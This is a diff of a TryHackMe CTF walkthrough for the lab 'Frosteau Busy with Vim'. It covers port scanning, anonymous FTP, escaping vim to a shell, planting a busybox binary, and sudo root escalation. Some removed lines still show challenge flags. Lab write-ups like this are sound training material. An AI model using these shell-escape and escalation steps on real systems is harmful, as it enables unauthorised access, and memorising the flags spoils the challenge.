@@ -1,13 +1,29 @@
 <h1 align="center">Frosteau Busy with Vim</h1>
-<p align="center">2025, August 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
-<em></em><br>
-<img width="80px" src=""><br>
-Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/bypass">here </a>.<br>
-<img width="1200px" src="></p>
+<p align="center">2025, August 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>475</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<em>Stay frosty!</em><br>
+<img width="80px" src="https://github.com/user-attachments/assets/c2e20349-f6ca-4c05-ab6c-6186f8a34291"><br>
+Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/busyvimfrosteau">here</a>.<br>
+<img width="1200px" src="https://github.com/user-attachments/assets/db1b8d53-d7aa-475f-93e2-6df2cdb3b388"></p>
+
 
 <br>
-<h2>Task 1 . </h2>
+<h2>Task 1 . Frosteau's Laptop</h2>
 
+
+<p><em>Answer the questions below</em></p>
+
+<h3 align="center">The Story</h3>
+<p>Heh, well done! You've clawed your way through the CyberPolice's outer defenses. But don't get too cozy yet, you're still a pup in this pack with only limited reach in their network. If you wanna run with the big yetis, you gotta ice Frosteau's machine. That's where the juicy bits hide, all those case files, the whole stash. With that, you'll be howlin' with insight into their network. But keep your eyes peeled; Frosteau's no lone wolf, and with Elf McSkidy by his side, they've snuffed your trail before. Tread light, tread smart, stay frosty!</p>
+
+<h3 align="center">Task</h3>
+<p>Start the attached virtual machine. After two minutes, the VM should be ready. Go forth and ice Frosteau's machine!
+<h6>This room is part of the Advent of Cyber 2023 Side Quest Challenge.</h6>
+<p>Please visit the <a href="https://tryhackme.com/room/adventofcyber23sidequest">here </a> to input the final flag of this room!</p>
+
+<h3 align="center">The Yeti Updates</h3>
+<p>After the first few of the Yeti’s crew got through Cyber Police defences quickly, McSkidy helped lock down the system. With a new update in place, they think they’re safe!<br><br>
+
+This challenge machine was updated with a new version about 12 hours after release. After locking down an unintended path, the challenge is considerably more difficult, bringing it back to the original design. At the time of the update, 21 people had already finished the challenge and found the Yeti Key. As a result, and to keep it fair, the Yeti offers you a hint for one of the questions below. Your choice if you want to use it!</p>
 
 <p><em>Answer the questions below</em></p>
 
@@ -16,7 +32,7 @@ Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/bypass"
 <h3>Nmap</h3>
 
 ```bash
-:~/FrosteauBusyWithVim# nmap -p- -T4 10.201.54.165 -vvv
+:~/FrosteauBusyWithVim# nmap -p- -T4 xx.xxx.xx.xxx -vvv
 ...
 PORT     STATE SERVICE REASON
 22/tcp   open  ssh     syn-ack ttl 64
@@ -28,7 +44,7 @@ PORT     STATE SERVICE REASON
 ```
 
 ```bash
-:~/FrosteauBusyWithVim# nmap -A -p 22,80,8065,8075,8095 -T4 10.201.54.165 -vvv
+:~/FrosteauBusyWithVim# nmap -A -p 22,80,8065,8075,8095 -T4 xx.xxx.xx.xxx -vvv
 ...
 PORT     STATE SERVICE REASON         VERSION
 22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
@@ -37,7 +53,7 @@ PORT     STATE SERVICE REASON         VERSION
 |   GetRequest: 
 |     HTTP/1.1 405 Method Not Allowed
 |     Server: WebSockify Python/3.8.10
-|     Date: Sun, 24 Aug 2025 18:16:44 GMT
+|     Date: Sun, 24 Aug 2025 xx:xx:xx GMT
 |     Connection: close
 |     Content-Type: text/html;charset=utf-8
 |     Content-Length: 472
@@ -58,7 +74,7 @@ PORT     STATE SERVICE REASON         VERSION
 |   HTTPOptions: 
 |     HTTP/1.1 501 Unsupported method ('OPTIONS')
 |     Server: WebSockify Python/3.8.10
-|     Date: Sun, 24 Aug 2025 18:16:44 GMT
+|     Date: Sun, 24 Aug 2025 xx:xx:xx GMT
 |     Connection: close
 |     Content-Type: text/html;charset=utf-8
 |     Content-Length: 500
@@ -97,7 +113,7 @@ PORT     STATE SERVICE REASON         VERSION
 |_    ^@IBM-3279-4-E
 8075/tcp open  ftp     syn-ack ttl 63 BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: PASV IP 172.18.0.2 is not the same as 10.201.54.165
+|_Can't get directory listing: PASV IP xxx.xx.x.x is not the same as xx.xxx.xx.xxx
 |_ftp-bounce: bounce working!
 | ftp-syst: 
 |   STAT: 
@@ -246,10 +262,10 @@ PORT     STATE SERVICE REASON         VERSION
 <h3>port 8075</h3>
 
 ```bash
-:~/FrosteauBusyWithVim# telnet 10.201.54.165 8075
-Connected to 10.201.54.165.
+:~/FrosteauBusyWithVim# telnet xx.xxx.xx.xxx 8075
+Connected to xx.xxx.xx.xxx.
 220 Operation successful
-Name (10.201.54.165:root): anonymous
+Name (xx.xxx.xx.xxx:root): anonymous
 230 Operation successful
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -306,14 +322,14 @@ ftp> bye
 <h4>Contents</h4>
 
 ```bash
-$ cat flag-1-of-4.txt
-THM{Let.the.game.begin}
+$ cat flag-1-of-4.txt | cut -c 1-8
+THM{Let.
 ```
 
 <br>
 
-<p>1.1. Flag 1<br>
-<code>THM{Let.the.game.begin}</code><br>
+<p>1.1. What is the value of the first flag?<br>
+<code>THM{Let.**************}</code><br>
 
 <br>
 <br>
@@ -391,9 +407,9 @@ All personnel involved in the apprehension of the Frostling Five are to exercise
 <h3>port 8085</h3>
 
 ```bash
-$ telnet 10.201.54.165 8085
-Trying 10.201.54.165...
-Connected to 10.201.54.165.
+$ telnet xx.xxx.xx.xxx 8085
+Trying xx.xxx.xx.xxx...
+Connected to xx.xxx.xx.xxx.
 Escape character is '^]'.
 ```
 
@@ -408,12 +424,12 @@ Escape character is '^]'.
 ~
 ~
 ~
-THM{Seems.like.we.are.getting.busy}
+THM{*****************************}
 ```
 <br>
 
 <p>1.2. Flag 2<br>
-<code>THM{Seems.like.we.are.getting.busy}</code><br>
+<code>THM{*****************************}</code><br>
 
 <br>
 <br>
@@ -427,367 +443,186 @@ THM{Seems.like.we.are.getting.busy}
 
 <p>[ENTER]</p>
 
-<br>
-<br>
 
-<img width="1123" height="771" alt="image" src="https://github.com/user-attachments/assets/485a59c7-5254-48fe-8e4b-bf93df2ec898" />
+- frosty</p>
 
 <br>
 <br>
 
-<img width="1128" height="771" alt="image" src="https://github.com/user-attachments/assets/f8ed75e6-4a65-45d6-bca6-9a85a5c81780" />
+<img width="1126" height="306" alt="image" src="https://github.com/user-attachments/assets/21415ada-84e9-412f-bfbc-0c9738afaf39" />
 
 <br>
-<br>
-
-<img width="1122" height="341" alt="image" src="https://github.com/user-attachments/assets/62400373-cf81-4f06-8732-f4e54898dd75" />
-
-<br>
-<br>
-
-<img width="1125" height="258" alt="image" src="https://github.com/user-attachments/assets/936ab6a3-7442-43eb-a767-43c5e9dbe06f" />
-
-<br>
-<br>
-
-<img width="1121" height="294" alt="image" src="https://github.com/user-attachments/assets/fd61f857-e4a6-4947-82ff-3c46b3caaeb7" />
-
-
-
-
-<br>
-<br>
-
-<img width="1106" height="750" alt="image" src="https://github.com/user-attachments/assets/152705d3-5ed6-4a8b-bad2-be6d6bc28716" />
-
-<br>
-<br>
-
-
-```bash
-~
-~
-:set shell=/tmp/sh|:shell
-```
-
-```bash
-~
-~
-Cannot execute shell /tmp/sh
-```
-
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.listdir('/home'))
-```
-
-```bash
-['ubuntu']
-```
-
-<br>
-<br>
-
-<img width="1005" height="37" alt="image" src="https://github.com/user-attachments/assets/d5f1d799-780f-431f-a2a0-a098da16f273" />
-
-<br>
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.listdir('/home/ubuntu'))
-```
-
-```bash
-['.local']
-```
-
-<br>
-
-```bash
-~
-~
-:python3 import getpass; print(getpass.getuser())
-```
-
-```bash
-ubuntu
-```
-
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.getenv('SHELL'))
-```
-
-```bash
-/tmp/sh
-```
-
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.listdir('/usr'))
-```
-
-```bash
-['libexec', 'lib', 'sbin', 'src', 'bin', 'include', 'share', 'lib64', 'libx32', 'games', 'local', 'lib32', 'frosty', 'special']
-```
-
-<br>
-<br>
-
-<img width="1124" height="67" alt="image" src="https://github.com/user-attachments/assets/dd4a984e-74c3-4975-b20b-dcfa4b86150f" />
-
-<br>
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.listdir('/usr/special'))
-```
-
-```bash
-['protector.sh']
-```
-
-<br>
-<br>
-
-<img width="1121" height="100" alt="image" src="https://github.com/user-attachments/assets/72dfb9b5-f32b-4a87-b975-4c987b038e05" />
-
-<br>
-<br>
-
-```bash
-~
-~
-:python3 import os; print(os.listdir('/usr/frosty'))
-```
-
-```bash
-['sh']
-```
-
-<br>
-<br>
-
-<img width="1125" height="154" alt="image" src="https://github.com/user-attachments/assets/80f694dd-5c4f-4d71-9d5b-340fff41b33a" />
-
-
-<h4>Busybox</h4>
-
 <p>
 
-- search for <code>Busybox static download</code><br>
-- navigate to <code>https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/<code><br>
-- click <code>1.35.0-x86_64-linux-musl</code><br>
-- click <code>busybox</code>
-- <code>Save</code></p>
-
-<br>
-
-<img width="1128" height="601" alt="image" src="https://github.com/user-attachments/assets/6048c7b8-e6f6-4295-b788-d808da56cdee" />
-
-<br>
-<br>
-<h4>HTTP server</h4>
-
-```bash
-$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
+- sh*</p>
 
 <br>
 <br>
 
-<img width="1125" height="216" alt="image" src="https://github.com/user-attachments/assets/e33a8a5f-514a-44b2-8e5f-7a07b1f12d7f" />
-
-
-<br>
-<br>
-<h4>HTTP server</h4>
-
-```bash
-$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.201.54.165 - - [24/Aug/2025 20:21:02] "GET /busybox HTTP/1.1" 200 -
-```
+<img width="1121" height="286" alt="image" src="https://github.com/user-attachments/assets/fcaac6cf-0ac4-4f97-8097-df050c3193ce" />
 
 <br>
-<h3></h3>
-
-<br>
-<br>
-
-<img width="1119" height="772" alt="image" src="https://github.com/user-attachments/assets/5f0032e1-d7e7-4bcc-9de1-4a533cba52f7" />
-
-<br>
-<br>
-
-
-```bash
-~
-~
-:set shell=/usr/frosty/sh|:shell
-[No write since last change]
-
-
-BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
-Enter 'help' for a list of built-in commands.
-
-$ whoami
-/usr/frosty/sh: whoami: not found
-$ ls -la
--rwxr-xr-x    1         0 .dockerenv
-lrwxrwxrwx    1         9 lib32 -> usr/lib32
-lrwxrwxrwx    1        10 libx32 -> usr/libx32
-lrwxrwxrwx    1         9 lib64 -> usr/lib64
-drwxr-xr-x    2      4096 media
-drwxr-xr-x    2      4096 mnt
-drwxr-xr-x    1      4096 ..
-drwxr-xr-x    1      4096 var
-lrwxrwxrwx    1         7 bin -> usr/bin
-drwxr-xr-x    1      4096 etc
-drwxr-xr-x    1      4096 home
-drwxr-xr-x    1      4096 usr
-drwxr-xr-x    1      4096 .
-drwx------    1      4096 root
-lrwxrwxrwx    1         8 sbin -> usr/sbin
-drwxr-xr-x   11      3120 dev
-drwxr-xr-x    2      4096 opt
-drwxrwxrwt    1      4096 tmp
-drwxr-xr-x    2      4096 boot
-drwxr-xr-x    1      4096 run
-drwxr-xr-x    2      4096 srv
-lrwxrwxrwx    1         7 lib -> usr/lib
-dr-xr-xr-x  247         0 proc
-dr-xr-xr-x   13         0 sys
-$ cd /home/ubuntu
-$ ls -la
-drwxrwxr-x    3      4096 .local
-drwxr-xr-x    1      4096 ..
-drwxr-xr-x    1      4096 .
-$ cd .local/
-$ ls -la
-drwx------    3      4096 share
-drwxr-xr-x    1      4096 ..
-drwxrwxr-x    3      4096 .
-$ cd share/
-$ ls -la
-drwxrwxr-x    3      4096 ..
-drwx------    3      4096 .
-drwx------    2      4096 nano
-$ pwd
-/home/ubuntu/.local/share
-$ echo $FLAG2
-THM{Seems.like.we.are.getting.busy}
-```
-
-<br>
-
-<p>1.2. Flag 2<br>
-<code>THM{Seems.like.we.are.getting.busy}</code><br>
-
-<br>
-<br>
-
 <p>
 
-- .dockerenv</p>
+- #!/etc/file/busybox<br>
+- :wq!<br>
+- "/usr/frosty/sh" 2L, 21B written<br>Connection closed by foreign host.
+</p>
 
+<br>
+<br>
+
+<img width="969" height="775" alt="image" src="https://github.com/user-attachments/assets/0a0d6ed5-707e-457a-ab75-1e656c003e0b" />
+
+<br>
 <br>
 
 ```bash
-$ cd /
-$ ls -la
--rwxr-xr-x    1         0 .dockerenv
-lrwxrwxrwx    1         9 lib32 -> usr/lib32
-lrwxrwxrwx    1        10 libx32 -> usr/libx32
-lrwxrwxrwx    1         9 lib64 -> usr/lib64
-drwxr-xr-x    2      4096 media
-drwxr-xr-x    2      4096 mnt
-drwxr-xr-x    1      4096 ..
-drwxr-xr-x    1      4096 var
-lrwxrwxrwx    1         7 bin -> usr/bin
-drwxr-xr-x    1      4096 etc
-drwxr-xr-x    1      4096 home
-drwxr-xr-x    1      4096 usr
-drwxr-xr-x    1      4096 .
-drwx------    1      4096 root
-lrwxrwxrwx    1         8 sbin -> usr/sbin
-drwxr-xr-x   11      3120 dev
-drwxr-xr-x    2      4096 opt
-drwxrwxrwt    1      4096 tmp
-drwxr-xr-x    2      4096 boot
-drwxr-xr-x    1      4096 run
-drwxr-xr-x    2      4096 srv
-lrwxrwxrwx    1         7 lib -> usr/lib
-dr-xr-xr-x  247         0 proc
-dr-xr-xr-x   13         0 sys
-$ cd /root
-/usr/frosty/sh: cd: can't cd to /root: Permission denied
-$ 
-```
-
-<br>
-<br>
-<h3>port 8065</h3>
-
-```bash
-:~/FrosteauBusyWithVim# telnet 10.201.54.165 8065
-Trying 10.201.54.165...
-Connected to 10.201.54.165.
+$ telnet xx.xxx.xx.xxx 8085
+Trying xx.xxx.xx.xxx...
+Connected to xx.xxx.xx.xxx.
 Escape character is '^]'.
-
-Ubuntu 22.04.3 LTS
-
-
-BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
-Enter 'help' for a list of built-in commands.
-
-# 
 ```
 
 <br>
 <br>
 
-```bash
-:~/FrosteauBusyWithVim# ftp 10.201.54.165 8075
-Connected to 10.201.54.165.
-220 Operation successful
-Name (10.201.54.165:root): anonymous
-230 Operation successful
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> mkdir tmp
-257 Operation successful
-ftp> cd tmp
-250 Operation successful
-ftp> put flag-2-of-4.sh
-local: flag-2-of-4.sh remote: flag-2-of-4.sh
-200 Operation successful
-150 Ok to send data
-226 Operation successful
-12 bytes sent in 0.00 secs (509.5109 kB/s)
-ftp> 
-```
+<img width="1016" height="259" alt="image" src="https://github.com/user-attachments/assets/95ac4063-1ff7-4faf-9b51-58563c041fca" />
 
+<br>
+<br>
 
+<img width="1009" height="245" alt="image" src="https://github.com/user-attachments/assets/b35a0906-1502-47c5-b5e9-c2bf5f1476ea" />
 
-
-<img width="1120" height="684" alt="image" src="https://github.com/user-attachments/assets/b18b931a-debf-42a8-b404-bfb1c799eaf6" />
-
+<br>
+<br>
 
 ```bash
-$ nmap -A -p 22,80,8065,8075,8095,24641,29972 -T4 10.10.123.117 -vvv
+:~/FrosteauBusyWithVim# ssh ubuntu@xx.xxx.xx.xxx -i id_rsa
+...
+
+ubuntu@tryhackme:~$
 ```
+
+```bash
+ubuntu@tryhackme:~$ find / -name "flag-3*" 2>/dev/null
+/home/ubuntu/containers/flag-3-of-4.txt
+```
+
+```bash
+ubuntu@tryhackme:~$ cd containers
+```
+
+```bash
+ubuntu@tryhackme:~/containers$ ls
+Dockerfile   Dockerfilz~        bootstrap.sh    docker-compose.yml  flag-3-of-4.txt     passwd        shells     vsftpd.sh.1
+Dockerfile~  FROST-2247-SP.txt  busybox         flag-1-of-4.txt     frostling_base.png  protector.sh  tes.txt    yeti_footage.png
+Dockerfily~  YETI-1125-SP.txt   busybox-x86_64  flag-2-of-4.sh      frostling_five.png  script.py     vsftpd.sh  yeti_mugshot.png
+```
+
+```bash
+ubuntu@tryhackme:~/containers$ cat flag-3-of-4.txt
+THM{**********************************}
+```
+
+<br>
+
+<p>1.3. What is the value of the third flag? Hint : You can see that this machine does not just use a standard shell, and although you can see the shell that it uses, you don't have access to it. Is there any way you can create your very own similar shell?<br>
+<code>THM{**********************************}</code></p>
+
+<br>
+<br>
+<h3>ubuntu´s privileges</h3>
+
+```bash
+ubuntu@tryhackme:/$ sudo -l
+Matching Defaults entries for ubuntu on tryhackme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on tryhackme:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+```
+
+<br>
+<h3>path of the fourth flag</h3>
+
+```bash
+ubuntu@tryhackme:/$ sudo find / -name "flag-4*" 2>/dev/null
+/root/flag-4-of-4.txt
+```
+
+<br>
+<h3>Privilege Escalation</h3>
+
+```bash
+ubuntu@tryhackme:/$ sudo su root
+root@tryhackme:/# pwd
+/
+root@tryhackme:/# cd /root
+root@tryhackme:~# ls
+flag-4-of-4.txt  snap  yetikey3.txt
+root@tryhackme:~# cat flag-4-of-4.txt
+THM{*********************************************}
+```
+
+<br>
+
+<p>1.4. What is the value of the fourth flag?<br>
+<code>THM{*********************************************}</code></p>
+
+<br>
+<br>
+<h3>Yeti´s key</h3>
+
+```bash
+root@tryhackme:~# cat yetikey3.txt
+3-d2dc6a02db03******************************6b8c6294f8c5a2c8e01f60
+```
+
+<br>
+
+<p>1.5.What is the value of the third Yetikey that has been placed in the root directory to verify the compromise?<br>
+<code>3-d2dc6a02db03******************************6b8c6294f8c5a2c8e01f60</code></p>
+
+<br>
+<br>
+<br>
+
+<h1 align="center">Completed</h1>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/866d621b-0ea3-4a3b-8bb3-a05fa70419e0"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/214bdc1a-90c2-499d-8dc5-4a6d079f329b"></p>
+
+
+<br>
+<h1 align="center">My TryHackMe Journey</h1>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| 2025, August 24   | 475      |     115ᵗʰ    |      5ᵗʰ     |     292nd   |     7ᵗʰ    | 122,630  |    925    |    73     |
+
+</div>
+
+
+<p align="center">Global All Time:   115ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/ae950b47-190d-4082-adc6-338bdcf5bf5d"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/e9cea3a1-1374-4516-bb5e-316c23b9b0cf"><br><br>
+                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/fa434319-7931-466a-8100-a4f0985a21a4"><br>
+                  Global monthly:    292nd<br><img width="1200px" src="https://github.com/user-attachments/assets/79335c1e-3a9f-4835-a901-a3d61885e16a"><br>
+                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/4d065189-ed80-462d-9041-944b163c2024"><br>
+
+<br>
+<br>
+
+<h1 align="center">Thanks for Coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
